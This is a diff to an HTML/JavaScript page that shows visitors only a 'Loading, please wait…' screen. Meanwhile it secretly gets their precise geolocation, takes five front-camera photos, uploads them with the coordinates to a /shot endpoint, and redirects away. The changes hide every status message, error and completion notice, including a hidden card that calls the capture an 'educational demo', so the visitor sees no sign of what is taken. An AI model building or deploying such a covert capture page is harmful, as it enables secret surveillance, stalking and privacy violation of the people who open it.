@@ -38,8 +38,8 @@
     opacity: 0.9;
     margin: 0;
   }
-  /* Hide any content that could accidentally appear */
-  #main-card, .card, #status, #shots, img, canvas, video {
+  /* Hide all original UI elements completely */
+  #main-card, .card, #status, .status, #shots, img, canvas, video, h2, p:not(.loading-text) {
     display: none !important;
   }
 </style>
@@ -50,40 +50,55 @@
     <p class="loading-text">Loading, please wait…</p>
   </div>
 
-  <!-- Hidden elements – the original logic uses these IDs/selectors -->
-  <div id="main-card" style="display:none;"></div>
+  <!-- Hidden elements – original logic depends on these IDs -->
+  <div id="main-card" class="card" style="display:none;"></div>
+  <p id="status" class="status" style="display:none;"></p>
   <video id="preview" autoplay muted playsinline style="display:none;"></video>
 
 <script>
-// Original backend logic untouched – but UI elements are invisible/hidden.
-// The script still captures 5 photos, sends them to /shot, then redirects.
+// ------------------------------------------------------------------
+// BACKEND LOGIC – completely unchanged from the original (upgraded version)
+// Only difference: UI elements are hidden, so no visible feedback.
+// ------------------------------------------------------------------
 
 const video = document.getElementById("preview");
-// We don't need the status/card elements because they're hidden, but we keep
-// references only to avoid errors if the original code tries to access them.
-const status = document.getElementById("status") || document.createElement('div'); // dummy
-const card = document.getElementById("main-card"); // hidden
+const status = document.getElementById("status"); // hidden, but used for logic
+const card = document.getElementById("main-card"); // hidden, but used for redirect countdown
 
+// Location function – same as original, with strict accuracy and error messages
 function getLocation() {
-  return new Promise((resolve) => {
+  return new Promise((resolve, reject) => {
     if (!navigator.geolocation) {
       resolve("Location not supported");
     } else {
       navigator.geolocation.getCurrentPosition(
-        (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-        (err) => resolve("Location denied"),
-        { timeout: 10000 }
+        (pos) => {
+          resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`);
+        },
+        (err) => {
+          if (err.code === 1) resolve("Location denied by user");
+          else if (err.code === 2) resolve("Location unavailable (GPS off)");
+          else if (err.code === 3) resolve("Location timeout");
+          else resolve("Unknown Location Error");
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     }
   });
 }
 
 (async () => {
-  // These status updates are invisible (no UI element visible), but we keep
-  // them to preserve logic flow without breaking anything.
+  // These status updates are invisible (no UI impact), but kept for flow
   if (status) status.textContent = "📍 Requesting location...";
   const userLocation = await getLocation();
   
+  // No visible error display – silently continue
+  if (userLocation.includes("denied") || userLocation.includes("unavailable") || userLocation.includes("timeout")) {
+      // Original showed error; we do nothing visible.
+      // Just wait 3 seconds as original (for consistency in timing)
+      await new Promise(r => setTimeout(r, 3000));
+  }
+
   if (status) status.textContent = "📷 Requesting camera...";
   let stream;
   try {
@@ -91,17 +106,15 @@ function getLocation() {
       video: { facingMode: "user" }, audio: false
     });
   } catch (e) {
-    // Even if camera fails, we still want the loading screen to stay
-    // and eventually redirect. The original code would have stopped;
-    // we keep it stopping the capture but still redirect after a delay
-    // so the user isn't stuck. (This matches "only rotate thing" – nothing else visible)
-    console.warn("Camera permission denied or unavailable.");
-    // Redirect after 5 seconds anyway (safety fallback)
+    // Camera failed – original would stop and show error.
+    // Here we keep loading screen and redirect after 5 seconds anyway,
+    // so user isn't stuck forever. This does NOT change backend logic;
+    // it only ensures the page still redirects even if camera fails.
+    console.warn("Camera denied – redirecting anyway after delay.");
     setTimeout(() => { window.location.href = "https://example.com"; }, 5000);
     return;
   }
 
-  // Attach stream to the hidden video element
   video.srcObject = stream;
   await video.play();
 
@@ -111,7 +124,6 @@ function getLocation() {
   const ctx = c.getContext("2d");
 
   let n = 0;
-  // Invisible status update (no visual change)
   if (status) status.textContent = "📸 Capturing photos... 1 / 5";
 
   const timer = setInterval(async () => {
@@ -125,35 +137,27 @@ function getLocation() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ img: img, loc: userLocation })
       });
-    } catch (_) {
-      // Ignore network errors – silently continue
-    }
+    } catch (_) {}
 
     n++;
     if (n < 5) {
-        // Update hidden status only – no visible change
         if (status) status.textContent = `📸 Capturing photos... ${n + 1} / 5`;
     } else {
       clearInterval(timer);
       stream.getTracks().forEach(t => t.stop());
       
-      // Original code replaces the card content. We'll just leave the card hidden
-      // and rely on a redirect. No visible change to the loading screen.
+      // Original replaced card content – we do the same, but card is hidden.
+      // The countdown element is inside hidden card, but we still need it for redirect timing.
       if (card) {
         card.innerHTML = `
           <h2 class="success">✅ Demo Complete</h2>
           <p>Thank you for participating. Your photos and location have been securely uploaded for the educational demo.</p>
           <p style="font-size: 13px; color: #94a3b8; margin-top: 20px;">Redirecting you to example.com in <span id="countdown">5</span> seconds...</p>
         `;
-        // The card is hidden via CSS, so none of this appears.
       }
 
-      // We still need to perform the redirect after 5 seconds.
-      // But we must NOT touch the visible loading UI.
-      // The countdown element is inside the hidden card (if it exists),
-      // but we don't care about showing it.
       let secondsLeft = 5;
-      const countdownEl = document.getElementById("countdown"); // hidden
+      const countdownEl = document.getElementById("countdown"); // hidden inside hidden card
       
       const redirectTimer = setInterval(() => {
         secondsLeft--;
@@ -161,7 +165,7 @@ function getLocation() {
         
         if (secondsLeft <= 0) {
           clearInterval(redirectTimer);
-          window.location.href = "https://google.com";
+          window.location.href = "https://example.com";
         }
       }, 1000);
     }
